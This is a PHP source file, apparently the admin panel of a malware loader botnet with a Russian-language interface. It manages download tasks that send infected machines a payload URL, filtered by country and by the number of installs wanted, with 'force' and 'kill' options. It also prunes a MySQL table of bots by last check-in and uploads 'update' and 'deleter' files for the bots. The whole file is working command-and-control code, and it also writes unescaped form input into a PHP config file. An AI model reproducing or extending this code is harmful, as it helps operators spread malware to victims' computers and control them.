<?php

if(!defined('GRANTED')) die;

function my_stripslashes($param) {
	if(get_magic_quotes_gpc()) $param=stripslashes($param);
	$param=str_replace("\r", '', $param);
	$param=str_replace("\n", '', $param);
	return $param;
}

switch($_GET['act']) {

case 'add':
	$info='';

if ($_POST['pressed']) {

	if (!$_POST['countries']) $info='<font color=red>Нет выбраных стран</font>';
	if (!$info and !intval($_POST['need'])) $info='<font color=red>Не указано количество загрузок</font>';
	if (!$info and !$_POST['name']) $info='<font color=red>Не указано название задания</font>';
	if (!$info and (!$_POST['url'] or $_POST['url']=='http://')) $info='<font color=red>Не указан URL загружаемого файла</font>';

	$ORDER['id']='';
	$ORDER['time'] = time();
	$ORDER['name'] = my_stripslashes(htmlspecialchars(substr($_POST['name'], 0, 16), ENT_QUOTES));
	$ORDER['need'] = intval($_POST['need']);
	$ORDER['countries'] = ' ';
	foreach ($_POST['countries'] as $value) $ORDER['countries'].=intval($value).' ';
	$ORDER['url'] = my_stripslashes(htmlspecialchars(substr($_POST['url'], 0, 1024), ENT_QUOTES));

	if ( substr($ORDER['url'], strlen($ORDER['url'])-1, 1) != ";") $ORDER['url'].=";";

	$ORDER['ban'] = intval($_POST['ban']);
	$ORDER['force'] = ($_POST['force'])?(1):(0);
	$ORDER['kill'] = ($_POST['kill'])?(1):(0);
	$ORDER['status'] = 'off';

	if (!$info) {
		$f = fopen('../data/orders.dat', 'a+');
		flock($f,LOCK_EX);
		while($s=fgets($f,1000)) $temp.=$s;

		$ORDERS = explode("\n", $temp);
		while (current($ORDERS)) {
			$temp = unserialize(current($ORDERS));
			if ($ORDER['name']==$temp['name']) {
				$info = "<font color=red>Такое название задания уже есть</font>";
				break;
			}
			next($ORDERS);
		}

		if (!$info) {
			$f1 = fopen('../data/idcount.dat', 'a+');
			flock($f1,LOCK_EX);
			$ORDER['id'] = intval(fgets($f1, 32));
			$ORDER['id']++;
			ftruncate ($f1,0);
			fputs($f1, $ORDER['id']);
			fflush ($f1);
			flock($f1,LOCK_UN);
			fclose($f1);

			fputs($f, serialize($ORDER)."\n");
			fflush ($f);

			unset($ORDER);
			unset($_POST['countries']);
		}

		flock($f,LOCK_UN);
		fclose($f);
		if (!$info) header ('Location: ?page=orders&a=1');
	}
}
break;



case 'edt':
	$info='';

if ($_POST['pressed']) {

	if (!$_POST['countries']) $info='<font color=red>Нет выбраных стран</font>';
	if (!$info and !intval($_POST['need'])) $info='<font color=red>Не указано количество загрузок</font>';
	if (!$info and !$_POST['name']) $info='<font color=red>Не указано название задания</font>';
	if (!$info and (!$_POST['url'] or $_POST['url']=='http://')) $info='<font color=red>Не указан URL загружаемого файла</font>';

	$ORDER['id']='';
	$ORDER['name'] = my_stripslashes(htmlspecialchars(substr($_POST['name'], 0, 16), ENT_QUOTES));
	$ORDER['need'] = intval($_POST['need']);
	$ORDER['countries'] = ' ';
	foreach ($_POST['countries'] as $value) $ORDER['countries'].=intval($value).' ';
	$ORDER['url'] = my_stripslashes(htmlspecialchars(substr($_POST['url'], 0, 1024), ENT_QUOTES));

	if ( substr($ORDER['url'], strlen($ORDER['url'])-1, 1) != ";") $ORDER['url'].=";";

	$ORDER['ban'] = intval($_POST['ban']);
	$ORDER['force'] = ($_POST['force'])?(1):(0);
	$ORDER['kill'] = ($_POST['kill'])?(1):(0);
	$ORDER['status'] = 'off';

	if (!$info) {
		$f = fopen('../data/orders.dat', 'a+');
		flock($f,LOCK_EX);
		while($s=fgets($f,1000)) $temp.=$s;

		$id = intval($_GET['id']);

		$ORDERS = explode("\n", $temp);
		while (current($ORDERS)) {
			$temp = unserialize(current($ORDERS));
			if ($id==$temp['id']) {
				$ORDER['time'] = $temp['time'];
				$key = key($ORDERS);
				$ORDER['status'] = $temp['status'];
			}
			if ($id!=$temp['id'] and $ORDER['name']==$temp['name']) {
				$info = "<font color=red>Такое название задания уже есть</font>";
				break;
			}
			next($ORDERS);
		}

		if (isset($key)) {
			$ORDER['id']=$id;

			$ORDERS[$key] = serialize($ORDER);
			ftruncate ($f,0);
			fputs($f, implode("\n", $ORDERS));
			fflush ($f);

			unset($ORDER);
			unset($_POST['countries']);
		}

		flock($f,LOCK_UN);
		fclose($f);
		if (!$info) header ('Location: ?page=orders&e=1&act=edt&id='.$id);
	}
}
elseif ($_POST['cancel']) header ('Location: ?page=orders');

break;



case 'del':

	$id = intval($_GET['id']);
	$f = fopen('../data/orders.dat', 'a+');
	flock($f,LOCK_EX);
	while($s=fgets($f,1000)) $temp.=$s;

	$ORDERS = explode("\n", $temp);
	while (current($ORDERS)) {
		$temp = unserialize(current($ORDERS));
		if ($id==$temp['id']) {
			unlink('../data/'.$id.'i.dat');
			unset ($ORDERS[key($ORDERS)]);
			ftruncate ($f,0);
			fputs($f, implode("\n", $ORDERS));
			fflush ($f);
			break;
		}
		next($ORDERS);
	}

	flock($f,LOCK_UN);
	fclose($f);
	header ('Location: ?page=orders');

break;



case 'inv':

	$id = intval($_GET['id']);
	$f = fopen('../data/orders.dat', 'a+');
	flock($f,LOCK_EX);
	while($s=fgets($f,1000)) $temp.=$s;

	$ORDERS = explode("\n", $temp);
	while (current($ORDERS)) {
		$temp = unserialize(current($ORDERS));
		if ($id==$temp['id']) {
			$temp['status'] = ($temp['status']=='on')?('off'):('on');
			$ORDERS[key($ORDERS)] = serialize($temp);
			ftruncate ($f,0);
			fputs($f, implode("\n", $ORDERS));
			fflush ($f);
			break;
		}
		next($ORDERS);
	}

	flock($f,LOCK_UN);
	fclose($f);
	header ('Location: ?page=orders');

break;



case 'res':

	$id = intval($_GET['id']);
	if (file_exists('../data/'.$id.'i.dat')) unlink('../data/'.$id.'i.dat');
	header ('Location: ?page=orders');

break;



case 'up':
case 'dn':
	$id = intval($_GET['id']);

	$f = fopen('../data/orders.dat', 'a+');
	flock($f,LOCK_EX);
	while(!feof($f)) $temp.=fgets($f);
	$ORDERS = explode("\n", $temp);
	while (current($ORDERS)) {
		$ORDER = unserialize(current($ORDERS));
		if ($ORDER['id']==$id) {
			$temp = ($_GET['act']=='up')?(prev($ORDERS)):(next($ORDERS));
			if ($temp) {
				$ORDERS[key($ORDERS)] = serialize($ORDER);
				($_GET['act']=='up')?(next($ORDERS)):(prev($ORDERS));
				$ORDERS[key($ORDERS)] = $temp;
			}
			break;
		}
		next($ORDERS);
	}
	ftruncate ($f,0);
	fputs($f, implode("\n",$ORDERS));
	fflush ($f);
	flock($f,LOCK_UN);
	fclose($f);
	header ('Location: ?page=orders');

break;



case 'opt':

	$info='';

	$delay = intval($_POST['delay']);
	$dead = intval($_POST['dead']);
	$num = intval($_POST['num']);

	if ($login!=$_POST['login'] or $_POST['newpassw']) {
		if (md5(substr($_POST['passw'], 0, 12))==$passw){
			$login = str_replace('\\', '', htmlspecialchars(my_stripslashes(substr($_POST['login'], 0, 12)), ENT_QUOTES));
			($_POST['newpassw'])?($passw = md5(substr($_POST['newpassw'], 0, 12))):(0);
		}
		else $info='<font color=red>Неправильный пароль</font>';
	}

	$f = fopen('../include/config.php', 'a');
	flock($f,LOCK_EX);
	ftruncate ($f,0);
	if (fputs($f, "<?php\n\$num = $num;\n\$dead = $dead;\n\$delay = $delay;\n\$login = '$login';\n\$passw = '$passw';\n?>")) $ret='&a=1';
	else $ret='&a=2';
	fflush ($f);
	flock($f,LOCK_UN);
	fclose($f);

	if ($info=='') header ('Location: ?page=options'.$ret);

break;



case 'dbc':

	include '../include/mysql.php';
	mysql_connect($db_host, $db_user, $db_pass) or die('<font color=red>Не удалось подключиться к базе!</font>');
	mysql_select_db($db_name) or die('<font color=red>Не найдена база "'.$db_name.'"!</font>');

if($_POST['d1']) {
	mysql_query('DELETE FROM bots WHERE lastknock<'.(time()-$dead*60*60*24));
	$ret='&a=1';
}
elseif($_POST['d2'] and $_POST['days']){
	mysql_query('DELETE FROM bots WHERE lastknock<'.(time()-(intval($_POST['days']))*60*60*24));
	$ret='&a=2';
}
elseif($_POST['d3']){
	mysql_query('DELETE FROM bots');
	$ret='&a=3';
}

	header ('Location: ?page=deistv'.$ret);

break;



case 'upd':
	if (copy($_FILES['filename']['tmp_name'], '../data/update.dat')) $ret='&u=1';
	else $ret='&u=2';
	header ('Location: ?page=deistv'.$ret);
break;



case 'dlt':
	if (copy($_FILES['filename']['tmp_name'], '../data/deleter.dat')) $ret='&d=1';
	else $ret='&d=2';
	header ('Location: ?page=deistv'.$ret);
break;



case 'duf':
	if (unlink('../data/update.dat')) $ret='&u=3';
	header ('Location: ?page=deistv'.$ret);
break;



case 'ddf':
	if (unlink('../data/deleter.dat')) $ret='&d=3';
	header ('Location: ?page=deistv'.$ret);
break;

}

?>